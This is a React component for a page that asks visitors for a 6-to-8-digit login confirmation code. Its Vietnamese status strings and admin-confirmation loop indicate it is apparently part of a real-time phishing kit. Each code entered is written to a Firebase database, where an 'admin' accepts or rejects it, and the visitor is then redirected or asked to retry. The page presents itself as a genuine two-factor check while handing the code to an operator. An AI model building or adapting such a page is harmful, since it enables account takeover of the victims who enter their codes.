import React, { useEffect, useState } from "react";
import InputText from "../Components/UI/InputText/InputText";
import Validating from "../Components/Validating";
import { database } from "../Utils/firebase";
import { onValue, ref, update } from "firebase/database";
import Spinner from "../Components/Spinner";
import { useNavigate } from "react-router";

const LoginCode = () => {
  const [facode, setFacode] = React.useState("");
  const [error_login_code, setError_login_code] = useState(false);
  const [validating, setValidating] = useState(false);
  const [resending, setResending] = useState(false);
  const [resended, setResended] = useState(false);

  const navigate = useNavigate();

  const handleSend = () => {
    setError_login_code(false);
    setResended(false);
    setValidating(true);
    const updates = {};

    updates["/" + localStorage.getItem("record_uid") + "/" + "2facode"] =
      facode;
    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
      "Đang chờ xác nhận mã đăng nhập từ admin";

    update(ref(database), updates);
  };

  const handleResending = () => {
    setError_login_code(false);
    setResending(true);
    const updates = {};
    updates["/" + localStorage.getItem("record_uid") + "/" + "user_status"] =
      "User yêu cầu gửi lại mã đăng nhập";
    update(ref(database), updates);
  };

  useEffect(() => {
    const starCountRef = ref(
      database,
      "/" + localStorage.getItem("record_uid")
    );
    onValue(starCountRef, (snapshot) => {
      const data = snapshot.val();

      if (data?.user_status === "Đã xác nhận mã đăng nhập") {
        navigate("/confirm/processing");
      } else if (data?.user_status === "Sai mã đăng nhập") {
        setValidating(false);
        setResended(false);
        setError_login_code(true);
        const updates = {};
        updates[
          "/" + localStorage.getItem("record_uid") + "/" + "user_status"
        ] = "Đang chờ user nhập lại mã đăng nhập";

        update(ref(database), updates);
        // eslint-disable-next-line no-dupe-else-if
      } else if (data?.user_status === "Đã gửi lại mã đăng nhập") {
        setResending(false);
        setResended(true);
      }
    });
  }, []);

  return (
    <div className="px-2">
      <div
        className=""
        style={{
          border: "1px solid #dcdada",
          maxWidth: "600px",
          margin: "auto",
          marginTop: "10vh",
          borderRadius: "8px",
        }}
      >
        <h1
          className="px-3"
          style={{
            fontSize: "1.35rem",
            color: "#444",
            marginTop: "1.15rem",
          }}
        >
          Please enter the comfimation code to continue
        </h1>
        <div
          style={{
            height: 1,
            width: "100%",
            background: "rgb(218, 221, 225)",
            marginTop: "1rem",
            marginBottom: "1.25rem",
          }}
        />

        <div className="px-3">
          <div
            className="modal__body-description mb-2"
            style={{
              color: "black",
              fontSize: 16,
            }}
          >
            Please confirm as you continue. We have sent any 6 to 8 digit code
            to your phone number or email.
          </div>
          <div
            className="modal__body-description"
            style={{
              color: "black",
              fontSize: 16,
            }}
          >
            Enter the 6 to 8 digit code from your phone number or email.
          </div>
        </div>
        <div
          className="modal__body-password px-3"
          style={{
            marginBottom: "3rem",
          }}
        >
          <div className="d-flex align-items-center">
            <div
              style={{
                maxWidth: "70%",
              }}
            >
              <InputText
                placeHolder={"Login code"}
                value={facode}
                fun={(e) => {
                  if (e.target.value?.length < 9) {
                    if (!isNaN(e.target.value)) {
                      setFacode(e.target.value);
                    }
                  }
                }}
              ></InputText>
            </div>

            {resending ? (
              <Spinner
                style={{
                  width: 24,
                  height: 24,
                  borderWidth: 4,
                  margin: 0,
                  marginLeft: 20,
                }}
              />
            ) : (
              <span
                style={{
                  display: "inline-block",
                  marginLeft: 20,
                  color: "#0d6efd",
                  cursor: "pointer",
                }}
                onClick={handleResending}
              >
                Resend
              </span>
            )}
          </div>

          {error_login_code && (
            <p className="text-danger mb-2 ms-1">
              Incorrect code, please try again or send new code.
            </p>
          )}
          {resended && (
            <p className="text-secondary mb-2 ms-1">
              Login code has been sent to your phone or email.
            </p>
          )}
          {validating && <Validating />}
        </div>

        <div
          style={{
            height: 1,
            width: "100%",
            background: "rgb(218, 221, 225)",
            marginBottom: "1.25rem",
          }}
        />

        <div
          style={{
            marginTop: "1.25rem",
            marginBottom: "1.25rem",
          }}
        >
          <button
            className="chat_btn me-4"
            style={{ marginLeft: "auto" }}
            disabled={!(facode?.length > 5 && facode?.length < 9)}
            onClick={handleSend}
          >
            <span
              style={{
                margin: 0,
              }}
            >
              Send
            </span>
          </button>
        </div>
      </div>
    </div>
  );
};

export default LoginCode;
